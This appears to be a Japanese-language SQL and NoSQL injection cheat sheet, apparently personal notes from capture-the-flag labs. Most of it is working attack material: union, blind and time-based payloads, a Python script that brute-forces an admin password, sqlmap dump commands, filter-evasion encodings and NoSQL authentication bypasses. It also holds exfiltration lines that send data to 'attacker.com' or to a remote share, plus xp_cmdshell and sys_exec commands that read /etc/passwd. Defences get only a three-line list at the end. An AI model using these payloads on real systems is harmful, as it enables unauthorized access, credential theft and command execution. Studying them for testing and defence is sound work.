# SQL インジェクション

## Error Based SQLi

画面で Select している列数を探る

```sql
1 union select 1,2,3
```

存在しないデータと Union したら 1,2,3 が表示されるか？（最初の 1 行だけ画面に表示されるパターン）

```sql
0 union select 1,2,3
```

データベース名

```sql
0 union select 1,2,database()
```

DB 内のテーブル名。group_concat で 1 つにまとめてるのがポイント。

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'データベース名'
```

テーブル内の列名

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'テーブル名'
```

全行を 1 セルに表示する

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users
```

## Blind Based SQLi

DB のデータには興味がなく、ログイン画面をバイパスするような、結果だけを求める場合

```sql
' or 1=1;--
```

MySQL の場合、-- の後に空白文字か制御文字が必要なため、下記の形もある

```sql
' or 1=1;-- -
```

## Boolean Based SQLi

データベース名を探索する  
※「このユーザー名は既に存在します」と表示されるような場面で使う

```sql
-- この結果がTrueで
a' UNION SELECT 1,2,3 where database() like '%';--

-- この結果がFalseで
a' UNION SELECT 1,2,3 where database() like 'a%';--

-- この結果がTrueであるとき、sから始まる名前のデータベースが存在することが分かる
-- 2文字目以降も同様に繰り返すことで、全体が判明する
a' UNION SELECT 1,2,3 where database() like 's%';--
```

テーブル名を探索する

```sql
-- Trueであるとき、aから始まるテーブルが存在することが分かる
a' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'データベース名' and table_name like 'a%';--
```

列名を探索する

```sql
-- Trueであるとき、aから始まる列名が存在することが分かる
a' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='データベース名' and TABLE_NAME='テーブル名' and COLUMN_NAME like 'a%';
```

保存されているデータを探索する

```sql
-- Trueであるとき、passwordの1文字目はaであることが分かる
a' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

サンプルスクリプト

```python
#!/usr/bin/python3
import sys
import requests
import string


def send_p(url, query):
    payload = {"username": query, "password": "admin"}
    try:
        r = requests.post(url, data=payload, timeout=3)
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout: Try to adjust the timeout time")
        sys.exit(1)
    return r.text


def main(addr):
    url = f"http://{addr}/challenge3/login"
    flag = ""
    password_len = 38
    # Not the most efficient way of doing it...
    for i in range(1, password_len):
        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}":
            # Convert char to hex and remove "0x"
            h = hex(ord(c))[2:]
            query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
                f"{i},1)=CAST(X'{h}' AS TEXT)--"

            resp = send_p(url, query)
            if not "Invalid" in resp:
                flag += c
                print(flag)
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
        sys.exit(0)
    main(sys.argv[1])
```

sqlmap

```shell
sqlmap -u http://10.10.88.120:5000/challenge3/login --data="username=admin&password=admin"
--level=5 --risk=3 --dbms=sqlite --technique=b --dump
```

## Time Based Blind SQLi

Boolean Based と同じだが、結果を画面表示から判別できない場合に、時間遅延で Boolean の判定をする

```sql
-- これがすぐに返り、
a' UNION SELECT SLEEP(5);--

-- これで5秒の遅延が発生する場合、列数が2であることが分かる
a' UNION SELECT SLEEP(5),2;--

-- 遅延が発生する場合、1文字目が4であることが分かる
a' UNION SELECT sleep(5),2 from users where username='admin' and password like '4%';--
```

時間遅延を利用して、Salt、ユーザー名、メールアドレス、パスワードをクラックしているエクスプロイトの例  
https://www.exploit-db.com/exploits/46635

## 帯域外 SQLi

### ファイル出力

```SQL
-- MySQL, MariaDB
-- secure_file_priv設定で出力ディレクトリを限定可能
SELECT sensitive_data FROM users INTO OUTFILE '\\\\<ip>\\logs\\out.txt';

-- MS SQL Server
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\<ip>\logs\out.txt" -c -T';
```

### HTTP

```SQL
-- Oracle  see UTL_FILE
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```

## ORDER BY SQLi

具体例は、Prioritise CTF を参照。

```sh
# title でソートされる
http://prioritize.thm/?order=CASE%20WHEN(1=1)%20THEN%20title%20ELSE%20date%20END

# date でソートされる
http://prioritize.thm/?order=CASE%20WHEN(1=0)%20THEN%20title%20ELSE%20date%20END
```

## フィルター回避

```text
# URLエンコード
' OR 1=1-- -> %27%20OR%201%3D1--+

# 16進エンコード
name = 'admin' -> name = 0x61646d696e

# Unicodeエンコード
admin -> \u0061\u0064\u006d\u0069\u006e

# CONCAT
admin -> CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)
CHAR(0x61,0x64,0x6D,0x69,0x6E)

# スペースを置き換え
SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'
SELECT+FROM+users+WHERE+name='admin'
SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'
%09 (水平タブ)、%0A (改行)、%0C (フォームフィード)、%0D (復帰)、%A0 (改行なしスペース)

# キーワード回避
SELEcT * FROM users
SE/**/LECT * FROM/**/users

# 論理演算子
AND -> &&
OR -> ||
```

## インジェクションリスト

https://github.com/payloadbox/sql-injection-payload-list/raw/refs/heads/master/Intruder/exploit/Auth_Bypass.txt

intruder 等で使って弱点を探る。

## コマンド

MySQL で、lib_mysqludf_sys.so がロードされている場合に限る。

```sql
SELECT sys_eval('whoami');
SELECT sys_exec ('touch /var/lib/mysql/test.txt');
SELECT sys_exec ('echo "hello" > /var/lib/mysql/test.txt');
SELECT sys_exec ('cat /etc/passwd > /var/lib/mysql/test2.txt');
```

## sqlmap

email パラメータに SQLi 脆弱性がある場合

```shell
sqlmap -u "http://10.10.199.72/user_login.php" \
--method POST \
--data "email=aaa&password=bbb" \
--cookie "PHPSESSID=lfam149vv8q8ct03i4msqgpu1f" \
-p "email" -a \
--exclude-sysdbs \
--sql-query \
--parse-errors \
--batch -v 3
```

## NoSQL

### 演算子インジェクション

#### 認証バイパス

```php
# このクエリを想定したとき、
$user = $_POST['user'];
$pass = $_POST['pass'];
$q = new MongoDB\Driver\Query(['username'=>$user, 'password'=>$pass]);

# このポストデータを渡すと、
user[$ne]=xxxx&pass[$ne]=yyyy

# この連想配列として解釈されるため、
$_POST = [
    'user' => ['$ne' => 'xxxx'],
    'pass' => ['$ne' => 'yyyy']
];

# すべてのデータを抽出するクエリになる
$q = new MongoDB\Driver\Query(['username'=>['$ne' => 'xxx'], 'password'=>['$ne' => 'yyy']]);

# admin, user1 以外のユーザー
user[$nin][]=admin&user[$nin][]=user1&pass[$ne]=yyyy

$q = new MongoDB\Driver\Query(['username'=>['$nin' => ['admin', 'user1']], 'password'=>['$ne' => 'yyy']]);
```

#### パスワード推測

```php
# これでログインできるなら、パスワードは5文字
user=admin&pass[$regex]=^.{5}$

# これでログインできるなら、1文字目はc
user=admin&pass[$regex]=^c....$

```

## セキュリティ

- フレームワークの Prepared Statements を使用する
- 入力検証
- ユーザー入力のエスケープ
